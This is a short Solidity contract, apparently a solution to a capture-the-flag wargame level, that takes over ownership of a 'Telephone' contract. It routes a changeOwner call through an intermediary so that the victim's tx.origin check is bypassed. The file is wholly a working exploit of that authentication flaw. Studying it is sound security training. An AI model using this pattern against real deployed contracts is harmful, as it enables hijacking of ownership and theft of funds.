// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneAttack{
    Telephone victim;

    constructor(address _address){
        victim = Telephone(_address);
    }

    function attack(address _owner) public{
        victim.changeOwner(_owner);
    }
}